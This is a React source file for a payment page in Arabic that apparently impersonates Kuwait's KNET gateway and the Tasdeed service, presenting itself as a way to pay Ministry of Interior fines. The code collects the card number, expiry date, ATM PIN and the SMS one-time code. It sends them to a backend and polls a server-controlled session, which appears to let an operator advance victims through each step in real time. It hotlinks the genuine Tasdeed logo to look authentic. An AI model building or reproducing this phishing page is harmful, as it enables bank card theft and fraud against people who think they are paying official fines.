import { useState, useEffect, type FormEvent } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "success" | "failed";

const PREFIXES_4 = ["4062", "4192", "4244", "4311", "4502", "4506", "4512", "4514", "4523", "4525", "4529", "4644", "4716", "4856", "4893", "4904"];
const PREFIXES_5 = ["5130", "5132", "5133", "5135", "5136", "5139", "5174", "5196", "5206", "5211", "5215", "5241", "5247", "5256", "5285", "5313", "5314", "5316", "5326", "5360", "5370", "5407", "5433", "5440", "5491", "5520", "5577", "5588"];

export default function Payment() {
  const [, setLocation] = useLocation();
  const [stage, setStage] = useState<Stage>("card");
  const [paymentData, setPaymentData] = useState<any>(null);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  
  const [cardNumber, setCardNumber] = useState("");
  const [cardPrefix, setCardPrefix] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [pin, setPin] = useState("");
  const [otp, setOtp] = useState("");
  
  const [showPrefixes, setShowPrefixes] = useState(false);
  const [availablePrefixes, setAvailablePrefixes] = useState<string[]>([]);

  useEffect(() => {
    const data = sessionStorage.getItem("paymentData");
    if (!data) { setLocation("/"); return; }
    const parsed = JSON.parse(data);
    setPaymentData(parsed);
    
    createSessionMutation.mutate({
      selectedFines: parsed.selectedFines,
      totalAmount: parsed.totalAmount,
      civilId: parsed.civilId,
      enquiryType: "1",
      queryId: "manual"
    });
  }, []);

  useEffect(() => {
    if (cardPrefix === "4") {
      setAvailablePrefixes(PREFIXES_4);
      setShowPrefixes(true);
    } else if (cardPrefix === "5") {
      setAvailablePrefixes(PREFIXES_5);
      setShowPrefixes(true);
    } else {
      setShowPrefixes(false);
    }
  }, [cardPrefix]);

  const createSessionMutation = trpc.payment.createSession.useMutation({
    onSuccess: (data) => setSessionId(data.sessionId)
  });

  const { data: sessionStatus } = trpc.payment.getStatus.useQuery(
    { sessionId: sessionId || "" },
    { enabled: !!sessionId && stage.endsWith("_pending"), refetchInterval: 2000 }
  );

  useEffect(() => {
    if (sessionStatus?.stage) {
      if (sessionStatus.stage === "atm") setStage("otp");
      else setStage(sessionStatus.stage as Stage);
      if (sessionStatus.errorMessage) setError(sessionStatus.errorMessage);
    }
  }, [sessionStatus]);

  const submitCard = trpc.payment.submitCard.useMutation({
    onSuccess: () => setStage("card_pending"),
    onError: (err) => { setError(err.message); setStage("failed"); }
  });

  const submitOtp = trpc.payment.submitOtp.useMutation({
    onSuccess: () => setStage("otp_pending"),
    onError: (err) => { setError(err.message); setStage("failed"); }
  });

  const handleCardSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    submitCard.mutate({
      sessionId,
      cardName: "KNET",
      cardNumber: cardPrefix + cardNumber,
      cardExpiry: `${expiryMonth}/${expiryYear}`,
      cardCvv: pin
    });
  };

  const handleOtpSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    submitOtp.mutate({ sessionId, otpCode: otp });
  };

  if (!paymentData) return null;

  return (
    <div className="knet-wrapper" dir="rtl">
      <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" />
      <style>{`
        body { background-color: #f8f9fa !important; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        .knet-wrapper { min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
        .knet-card { width: 100%; max-width: 480px; background: white; border-radius: 10px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); border: 1px solid #eee; overflow: hidden; }
        .knet-header { background: #0082c3; padding: 15px; text-align: center; color: white; }
        .knet-body { padding: 30px; }
        .tasdeed-logo { height: 50px; margin-bottom: 25px; }
        .info-box { background: #f0f7ff; padding: 15px; border-radius: 8px; margin-bottom: 25px; border: 1px solid #cfe2ff; }
        .info-item { display: flex; justify-content: space-between; margin-bottom: 5px; font-size: 14px; }
        .info-label { font-weight: bold; color: #0056b3; }
        .knet-label { font-weight: bold; font-size: 14px; color: #333; margin-bottom: 8px; display: block; }
        .knet-input { border: 1px dashed #d9534f; border-radius: 5px; height: 42px; padding: 0 12px; font-size: 16px; width: 100%; outline: none; text-align: center; transition: all 0.3s; }
        .knet-input:focus { border-style: solid; border-color: #0082c3; box-shadow: 0 0 0 3px rgba(0,130,195,0.1); }
        .prefix-box { position: relative; display: flex; gap: 10px; }
        .prefix-menu { position: absolute; top: 45px; left: 0; right: 0; background: white; border: 1px solid #ddd; border-radius: 5px; z-index: 100; max-height: 160px; overflow-y: auto; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
        .prefix-opt { padding: 10px; cursor: pointer; font-size: 14px; border-bottom: 1px solid #f5f5f5; }
        .prefix-opt:hover { background: #0082c3; color: white; }
        .knet-btn { height: 48px; border-radius: 5px; font-weight: bold; font-size: 16px; border: none; cursor: pointer; width: 100%; transition: all 0.3s; }
        .btn-pay { background: #0082c3; color: white; }
        .btn-pay:hover { background: #0069a0; }
        .btn-back { background: #f8f9fa; color: #666; border: 1px solid #ddd; margin-top: 10px; }
        .knet-foot { margin-top: 40px; text-align: center; font-size: 12px; color: #888; line-height: 1.6; }
      `}</style>

      <div className="knet-card">
        <div className="knet-header">
          <h6 className="m-0">بوابة الدفع الإلكتروني KNET</h6>
        </div>
        <div className="knet-body">
          <div className="text-center">
            <img src="https://www.kpay.com.kw/kpg/images/tasdeed_logo.png" className="tasdeed-logo" alt="Tasdeed" />
          </div>

          <div className="info-box">
            <div className="info-item">
              <span className="info-label">المستفيد:</span>
              <span className="font-weight-bold">وزارة الداخلية</span>
            </div>
            <div className="info-item">
              <span className="info-label">المبلغ:</span>
              <span className="font-weight-bold text-danger">{paymentData.totalAmount} د.ك</span>
            </div>
          </div>

          {stage === "card" && (
            <form onSubmit={handleCardSubmit}>
              <div className="mb-4">
                <label className="knet-label">رقم البطاقة</label>
                <div className="prefix-box">
                  <div style={{width: '110px', position: 'relative'}}>
                    <input 
                      type="text" 
                      className="knet-input" 
                      placeholder="Prefix"
                      value={cardPrefix}
                      onChange={e => setCardPrefix(e.target.value.replace(/\D/g, '').substring(0, 4))}
                      required
                    />
                    {showPrefixes && (
                      <div className="prefix-menu">
                        {availablePrefixes.map(p => (
                          <div key={p} className="prefix-opt" onClick={() => { setCardPrefix(p); setShowPrefixes(false); }}>{p}</div>
                        ))}
                      </div>
                    )}
                  </div>
                  <input 
                    type="text" 
                    className="knet-input flex-grow-1" 
                    placeholder="رقم البطاقة"
                    value={cardNumber}
                    onChange={e => setCardNumber(e.target.value.replace(/\D/g, '').substring(0, 12))}
                    required
                  />
                </div>
              </div>

              <div className="row mb-4">
                <div className="col-6">
                  <label className="knet-label">تاريخ الانتهاء</label>
                  <div className="d-flex gap-2">
                    <input type="text" className="knet-input" placeholder="MM" value={expiryMonth} onChange={e => setExpiryMonth(e.target.value.replace(/\D/g, '').substring(0, 2))} required />
                    <input type="text" className="knet-input" placeholder="YY" value={expiryYear} onChange={e => setExpiryYear(e.target.value.replace(/\D/g, '').substring(0, 2))} required />
                  </div>
                </div>
                <div className="col-6">
                  <label className="knet-label">الرقم السري (PIN)</label>
                  <input type="password" maxLength={4} className="knet-input" placeholder="****" value={pin} onChange={e => setPin(e.target.value.replace(/\D/g, '').substring(0, 4))} required />
                </div>
              </div>

              <button type="submit" className="knet-btn btn-pay shadow-sm">إرسال</button>
              <button type="button" className="knet-btn btn-back" onClick={() => setLocation("/")}>إلغاء</button>
            </form>
          )}

          {stage === "otp" && (
            <form onSubmit={handleOtpSubmit} className="text-center">
              <h5 className="mb-4" style={{color: '#0082c3'}}>تأكيد الرمز (OTP)</h5>
              <p className="small text-muted mb-4">أدخل الرمز المكون من 6 أرقام المرسل لهاتفك</p>
              <input 
                type="text" 
                className="knet-input mb-4" 
                style={{letterSpacing: '10px', fontSize: '26px', height: '55px'}} 
                value={otp} 
                onChange={e => setOtp(e.target.value.replace(/\D/g, '').substring(0, 6))} 
                placeholder="000000" 
                required 
              />
              <button type="submit" className="knet-btn btn-pay">تأكيد العملية</button>
            </form>
          )}

          {stage.endsWith("_pending") && (
            <div className="text-center py-5">
              <div className="spinner-border text-primary" role="status"></div>
              <p className="mt-3 font-weight-bold" style={{color: '#0082c3'}}>جاري معالجة طلبك، يرجى الانتظار...</p>
            </div>
          )}

          {stage === "success" && (
            <div className="text-center py-4">
              <div className="mb-3" style={{fontSize: '60px'}}>✅</div>
              <h4 className="text-success font-weight-bold">تم الدفع بنجاح</h4>
              <p className="text-muted">شكراً لك، تم استلام مبلغ {paymentData.totalAmount} د.ك</p>
              <button className="knet-btn btn-pay mt-4" onClick={() => setLocation("/")}>العودة للرئيسية</button>
            </div>
          )}

          {stage === "failed" && (
            <div className="text-center py-4">
              <div className="mb-3" style={{fontSize: '60px'}}>❌</div>
              <h4 className="text-danger font-weight-bold">فشلت العملية</h4>
              <p className="text-muted">{error || "حدث خطأ أثناء معالجة الدفع، يرجى المحاولة لاحقاً"}</p>
              <button className="knet-btn btn-pay mt-4" onClick={() => setStage("card")}>حاول مرة أخرى</button>
            </div>
          )}
        </div>
      </div>

      <div className="knet-foot">
        جميع الحقوق محفوظة © 2026<br/>
        شركة الخدمات المصرفية الآلية المشتركة (كي نت)
      </div>
    </div>
  );
}
